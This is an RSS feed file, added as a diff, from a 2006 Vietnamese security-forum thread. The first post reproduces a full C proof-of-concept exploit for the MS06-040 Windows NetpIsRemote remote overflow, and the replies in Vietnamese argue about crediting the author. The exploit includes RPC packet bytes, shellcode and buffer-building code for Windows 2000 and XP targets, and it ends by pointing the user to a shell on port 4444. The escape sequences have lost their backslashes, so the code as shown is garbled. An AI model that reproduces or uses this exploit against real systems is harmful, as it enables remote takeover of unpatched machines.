@@ -1,0 +1,285 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "MS Windows NetpIsRemote() Remote Overflow (MS06-040)"]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/13.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "MS Windows NetpIsRemote() Remote Overflow (MS06-040)"]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>MS Windows NetpIsRemote() Remote Overflow (MS06-040)</title>
+				<description><![CDATA[ Rated as : Critical
+<span class="quotetxt"><b>Code:</b></span><br/>
+		<div class="coded"">
+		<pre>/*
+ * MS06-040 Remote Code Execution Proof of Concept
+ *
+ * Ported by ub3r st4r aka iRP
+ * ---------------------------------------------------------------------
+ * Tested Against:
+ *  Windows XP SP1
+ *  Windows 2000 SP4
+ *
+ * Systems Affected:
+ *  Microsoft Windows 2000 SP0-SP4
+ *  Microsoft Windows XP SP0-SP1
+ *  Microsoft Windows NT 4.0
+ * ---------------------------------------------------------------------
+ * This is provided as proof-of-concept code only for educational
+ * purposes and testing by authorized individuals with permission
+ * to do so.
+ *
+ * PRIVATE v.0.2 &#40;08-27-06&#41;
+ */
+
+#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+
+#pragma comment&#40;lib, "mpr"&#41;
+#pragma comment&#40;lib, "Rpcrt4"&#41;
+
+// bind uuid interface: 4b324fc8-1670-01d3-1278-5a47bf6ee188 v3.0
+unsigned char DCERPC_Bind_RPC_Service&#91;&#93; =
+      
+"x05x00x0Bx03x10x00x00x00x48x00x00x00x00x00x00x00"
+      
+"xD0x16xD0x16x00x00x00x00x01x00x00x00x00x00x01x00"
+      
+"xC8x4Fx32x4Bx70x16xD3x01x12x78x5Ax47xBFx6ExE1x88"
+      
+"x03x00x00x00x04x5Dx88x8AxEBx1CxC9x11x9FxE8x08x00"
+       "x2Bx10x48x60x02x00x00x00";
+
+// request windows api: NetprPathCanonicalize &#40;0x1f&#41;
+unsigned char DCERPC_Request_RPC_Service&#91;&#93; =
+      
+"x05x00x00x03x10x00x00x00x30x08x00x00x00x00x00x00"
+      
+"x18x08x00x00x00x00x1fx00xffxffxffxffx01x00x00x00"
+       "x00x00x00x00x01x00x00x00x00x00x00x00";
+
+       // path ...
+
+unsigned char DCERPC_Request_RPC_Service_&#91;&#93; =
+      
+"xfax00x00x00x02x00x00x00x00x00x00x00x02x00x00x00"
+       "x00x00x00x00xfax00x00x00x00x00x00x00";
+
+unsigned char sc&#91;&#93; =
+      
+"x6ax51x59xd9xeexd9x74x24xf4x5bx81x73x13xa8x97x90"
+      
+"x88x83xebxfcxe2xf4x29x53x6fx67x57x68xd4x74xc2x7c"
+      
+"xddx60x51x68x6fx77xc8x1cxfcxacx8cx1cxd5xb4x23xeb"
+      
+"x95xf0xa9x78x1bxc7xb0x1cxcfxa8xa9x7cxd9x03x9cx1c"
+      
+"x91x66x99x57x09x24x2cx57xe4x8fx69x5dx9dx89x6ax7c"
+      
+"x64xb3xfcxb3xb8xfdx4dx1cxcfxacxa9x7cxf6x03xa4xdc"
+      
+"x1bxd7xb4x96x7bx8bx84x1cx19xe4x8cx8bxf1x4bx99x4c"
+      
+"xf4x03xebxa7x1bxc8xa4x1cxe0x94x05x1cxd0x80xf6xff"
+      
+"x1exc6xa6x7bxc0x77x7exf1xc3xeexc0xa4xa2xe0xdfxe4"
+      
+"xa2xd7xfcx68x40xe0x63x7ax6cxb3xf8x68x46xd7x21x72"
+      
+"xf6x09x45x9fx92xddxc2x95x6fx58xc0x4ex99x7dx05xc0"
+      
+"x6fx5exfbxc4xc3xdbxfbxd4xc3xcbxfbx68x40xeexc0x86"
+      
+"xccxeexfbx1ex71x1dxc0x33x8axf8x6fxc0x6fx5exc2x87"
+      
+"xc1xddx57x47xf8x2cx05xb9x79xdfx57x41xc3xddx57x47"
+      
+"xf8x6dxe1x11xd9xdfx57x41xc0xdcxfcxc2x6fx58x3bxff"
+      
+"x77xf1x6exeexc7x77x7exc2x6fx58xcexfdxf4xeexc0xf4"
+      
+"xfdx01x4dxfdxc0xd1x81x5bx19x6fxc2xd3x19x6ax99x57"
+      
+"x63x22x56xd5xbdx76xeaxbbx03x05xd2xafx3bx23x03xff"
+      
+"xe2x76x1bx81x6fxfdxecx68x46xd3xffxc5xc1xd9xf9xfd"
+      
+"x91xd9xf9xc2xc1x77x78xffx3dx51xadx59xc3x77x7exfd"
+      
+"x6fx77x9fx68x40x03xffx6bx13x4cxccx68x46xdax57x47"
+       "xf8x67x66x77xf0xdbx57x41x6fx58";
+
+int main&#40;int argc, char* argv&#91;&#93;&#41;
+{
+       HANDLE hFile;
+       NETRESOURCE nr;
+
+       char szRemoteName&#91;MAX_PATH&#93;, szPipePath&#91;MAX_PATH&#93;;
+
+       unsigned int i;
+
+       unsigned char szInBuf&#91;4096&#93;;
+       unsigned long dwRead, nWritten;
+
+       unsigned char szReqBuf&#91;2096&#93;;
+
+       if &#40;argc &lt; 3&#41;{
+               printf&#40;"&#91;-&#93; Usage: ms06040poc &lt;host&gt;
+&#91;target&#93;n"&#41;;
+               printf&#40;"t1 - Windows 2000 SP0-SP4n"&#41;;
+               printf&#40;"t2 - Windows XP SP0-SP1n"&#41;;
+               return -1;
+       }
+
+       memset&#40;szReqBuf, 0, sizeof&#40;szReqBuf&#41;&#41;;
+
+       if &#40;atoi&#40;argv&#91;2&#93;&#41; == 1&#41; {
+               unsigned char szBuff&#91;1064&#93;;
+
+               // build payload buffer
+               memset&#40;szBuff, 'x90', 1000&#41;;
+               memcpy&#40;szBuff+630, sc, sizeof&#40;sc&#41;&#41;;
+
+               for&#40;i=1000; i&lt;1064; i+=4&#41; {
+                       memcpy&#40;szBuff+i, "x04x08x02x00", 4&#41;;
+               }
+
+               // build request buffer
+               memcpy&#40;szReqBuf, DCERPC_Request_RPC_Service,
+sizeof&#40;DCERPC_Request_RPC_Service&#41;-1&#41;;
+               memcpy&#40;szReqBuf+44, "x15x02x00x00", 4&#41;; /*
+max count */
+               memcpy&#40;szReqBuf+48, "x00x00x00x00", 4&#41;; /*
+offset */
+               memcpy&#40;szReqBuf+52, "x15x02x00x00", 4&#41;; /*
+actual count */
+               memcpy&#40;szReqBuf+56, szBuff, sizeof&#40;szBuff&#41;&#41;;
+               memcpy&#40;szReqBuf+1120, "x00x00x00x00", 4&#41;; /*
+align string */
+               memcpy&#40;szReqBuf+1124, DCERPC_Request_RPC_Service_,
+sizeof&#40;DCERPC_Request_RPC_Service_&#41;-1&#41;;
+               memcpy&#40;szReqBuf+1140 , "xebx02", 2&#41;;
+       }
+       if &#40;atoi&#40;argv&#91;2&#93;&#41; == 2&#41; {
+               unsigned char szBuff&#91;708&#93;;
+
+               memset&#40;szBuff, 'x90', 612&#41;; /* size of shellcode */
+               memcpy&#40;szBuff, sc, sizeof&#40;sc&#41;&#41;;
+
+               memcpy&#40;szBuff+612, "x0ax08x02x00", 4&#41;;
+               memset&#40;szBuff+616, 'A', 8&#41;; // 8 bytes padding
+               memcpy&#40;szBuff+624, "x04x08x02x00", 4&#41;;
+               memset&#40;szBuff+628, 'x90', 32&#41;;
+               memcpy&#40;szBuff+660, "x04x08x02x00", 4&#41;;
+               memset&#40;szBuff+664, 'B', 8&#41;; // 8 bytes padding
+               memcpy&#40;szBuff+672, "x04x08x02x00", 4&#41;;
+               memset&#40;szBuff+676, 'x90', 32&#41;;
+
+               // build request buffer
+               memcpy&#40;szReqBuf, DCERPC_Request_RPC_Service,
+sizeof&#40;DCERPC_Request_RPC_Service&#41;-1&#41;;
+               memcpy&#40;szReqBuf+44, "x63x01x00x00", 4&#41;; /*
+max count */
+               memcpy&#40;szReqBuf+48, "x00x00x00x00", 4&#41;; /*
+offset */
+               memcpy&#40;szReqBuf+52, "x63x01x00x00", 4&#41;; /*
+actual count */
+               memcpy&#40;szReqBuf+56, szBuff, sizeof&#40;szBuff&#41;&#41;;
+               memcpy&#40;szReqBuf+764, "x00x00x00x00", 4&#41;; /*
+align string */
+               memcpy&#40;szReqBuf+768, DCERPC_Request_RPC_Service_,
+sizeof&#40;DCERPC_Request_RPC_Service_&#41;-1&#41;;
+       }
+
+       printf&#40;"&#91;+&#93; Connecting to %s ... n", argv&#91;1&#93;&#41;;
+
+       _snprintf&#40;szRemoteName, sizeof&#40;szRemoteName&#41;,
+"\\%s\ipc$", argv&#91;1&#93;&#41;;
+       nr.dwType = RESOURCETYPE_ANY;
+       nr.lpLocalName = NULL;
+       nr.lpProvider = NULL;
+       nr.lpRemoteName = szRemoteName;
+       if &#40;WNetAddConnection2&#40;&nr, "", "", 0&#41; !=
+NO_ERROR&#41; {
+               printf&#40;"&#91;-&#93; Failed to connect to host !n"&#41;;
+               return -1;
+       }
+
+       _snprintf&#40;szPipePath, sizeof&#40;szPipePath&#41;,
+"\\%s\pipe\browser", argv&#91;1&#93;&#41;;
+       hFile = CreateFile&#40;szPipePath, GENERIC_READ|GENERIC_WRITE, 0, NULL,
+OPEN_EXISTING, 0, NULL&#41;;
+
+       if &#40;hFile == INVALID_HANDLE_VALUE&#41; {
+               printf&#40;"&#91;-&#93; Failed to open named pipe !n"&#41;;
+               return -1;
+       }
+
+       printf&#40;"&#91;+&#93; Binding to RPC interface ... n"&#41;;
+       if &#40;TransactNamedPipe&#40;hFile, DCERPC_Bind_RPC_Service,
+sizeof&#40;DCERPC_Bind_RPC_Service&#41;, szInBuf, sizeof&#40;szInBuf&#41;, &dwRead, NULL&#41;
+== 0&#41; {
+               printf&#40;"&#91;-&#93; Failed to bind to interface !n"&#41;;
+               CloseHandle&#40;hFile&#41;;
+               return -1;
+       }
+
+       printf&#40;"&#91;+&#93; Sending RPC request ... n"&#41;;
+       if &#40;!WriteFile&#40;hFile, szReqBuf, sizeof&#40;szReqBuf&#41;, &nWritten, 0&#41;&#41; {
+               printf&#40;"&#91;-&#93; Unable to transmit RPC request
+!n"&#41;;
+               CloseHandle&#40;hFile&#41;;
+               return -1;
+       }
+
+       printf&#40;"&#91;+&#93; Now check for shell on %s:4444 !n",
+argv&#91;1&#93;&#41;;
+
+       return 0;
+}</pre>
+		</div>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3334.hva#19001</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/3334.hva#19001</link>
+				<pubDate><![CDATA[Tue, 29 Aug 2006 13:16:29]]> GMT</pubDate>
+				<author><![CDATA[ LeonHart]]></author>
+			</item>
+			<item>
+				<title>MS Windows NetpIsRemote() Remote Overflow (MS06-040)</title>
+				<description><![CDATA[ Copyright!!!!!!!!!
+Phúc còn nhớ lúc trước pác BigBall_Hacker post 1 bài tương tự nhưng nhận được sự phản ứng kịch liệt từ MOD (tạo rác cho forum) thế nhưng mời anh Conmale xem lại bài này có khác gì không?
+Nếu có thể chỉ cần vậy thôi: http://milw0rm.com/exploits/2265 mọi người có thể tìm đến mà]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3334.hva#19410</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/3334.hva#19410</link>
+				<pubDate><![CDATA[Wed, 30 Aug 2006 23:04:17]]> GMT</pubDate>
+				<author><![CDATA[ PHUCDOAN]]></author>
+			</item>
+			<item>
+				<title>MS Windows NetpIsRemote() Remote Overflow (MS06-040)</title>
+				<description><![CDATA[ <p></p>
+		<cite class="blockquote">PHUCDOAN wrote:</cite><br>
+		<blockquote>Copyright!!!!!!!!!
+Phúc còn nhớ lúc trước pác BigBall_Hacker post 1 bài tương tự nhưng nhận được sự phản ứng kịch liệt từ MOD (tạo rác cho forum) thế nhưng mời anh Conmale xem lại bài này có khác gì không?
+Nếu có thể chỉ cần vậy thôi:<span class="link"> http://milw0rm.com/exploits/2265</span> mọi người có thể tìm đến mà&nbsp;
+		</blockquote>
+Tớ nghĩ là dòng màu cam cũng đủ để là bản quyền ! 
+
+nếu chỉ cần post link thì người đọc mất công nhấp thêm 1 click nữa rồi mới xem được ...
+
+nói chung ! Tốt nhất vửa post nội dung , vừa post link  :)) 
+<blockquote>/*
+  * MS06-040 Remote Code Execution Proof of Concept
+  *
+  * <font color='orange'>Ported by ub3r st4r aka iRP</font>
+  * ---------------------------------------------------------------------
+  * Tested Against:
+  *  Windows XP SP1
+  *  Windows 2000 SP4
+  *&nbsp;
+		</blockquote>]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/3334.hva#19453</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/3334.hva#19453</link>
+				<pubDate><![CDATA[Thu, 31 Aug 2006 02:34:50]]> GMT</pubDate>
+				<author><![CDATA[ havythoai]]></author>
+			</item>
+	</channel>
+</rss>
